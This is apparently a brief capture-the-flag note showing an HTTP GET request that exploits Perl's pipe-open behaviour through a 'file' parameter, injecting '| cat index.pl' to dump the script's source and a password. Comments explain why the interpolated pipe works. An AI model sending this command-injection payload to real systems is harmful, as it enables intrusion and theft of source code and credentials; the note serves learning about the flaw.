GET /index.pl?file=|%20cat%20index.pl%20 HTTP/1.1
# the reason that '| cat index.pl ' works is it gets interpolated into
# '| cat index.pl .txt'
# then perl tries to open 'cat index.pl .txt' for writing and lets the output pass through

# if the string was passed as-is, 'cat index.pl |' would open the handle for reading
# and perl would read line-by-line and echo it, and we would also get the password
# but since its interpolated, 'cat index.pl | .txt' does nothing since it doesn't
# end or start with a pipe